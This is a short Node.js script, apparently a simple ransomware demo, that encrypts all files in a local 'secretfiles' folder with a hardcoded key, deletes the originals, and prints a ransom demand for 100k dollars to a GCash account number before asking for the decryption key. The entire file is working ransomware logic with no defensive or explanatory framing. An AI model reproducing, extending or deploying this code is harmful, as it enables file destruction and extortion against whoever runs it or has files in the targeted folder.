let encryptor = require("file-encryptor");
let readlineSync = require("readline-sync");
let fs = require("fs");

let encryptionKey = "IamBrokeMan100,000dollars";
let secretfiles = "./secretfiles/";

let decryptionKey = "";
let noOfFilesinSecretFiles = fs.readdirSync(secretfiles).length;

fs.readdirSync(secretfiles).forEach((file, index) => {
  encryptor.encryptFile(
    `${secretfiles}${file}`,
    `${secretfiles}${file}.encrypt`,
    encryptionKey,
    function (err) {
      fs.unlinkSync(`${secretfiles}${file}`);
      if (index === noOfFilesinSecretFiles - 1) {
        console.log(
          `Your files have been encrypted. If you want to decrypt them, send 100k $ to my GCash account 09674385665 and I will give you the decryption key. Type "exit" to quit.`
        );

        while (true) {
          decryptionKey = readlineSync.question(
            "Please enter the decryption key: "
          );

          if (decryptionKey.toLowerCase() === "exit") {
            console.log("Exiting decryption process.");
            process.exit(1);
          }

          if (decryptionKey === encryptionKey) {
            decryptFiles(decryptionKey);
            break;
          } else {
            console.log(
              'Incorrect decryption key. Please try again or type "exit" to quit.'
            );
          }
        }
      }
    }
  );
});

function decryptFiles(decryptionKey) {
  let filesToDecrypt = fs.readdirSync(secretfiles);
  let filesDecrypted = 0;

  filesToDecrypt.forEach((file) => {
    encryptor.decryptFile(
      `${secretfiles}${file}`,
      `${secretfiles}${file}`.replace(".encrypt", ""),
      decryptionKey,
      function (err) {
        fs.unlinkSync(`${secretfiles}${file}`);
        filesDecrypted++;

        if (filesDecrypted === filesToDecrypt.length) {
          console.log("Congratulations, your files have been decrypted.");
          process.exit(1);
        }
      }
    );
  });
}
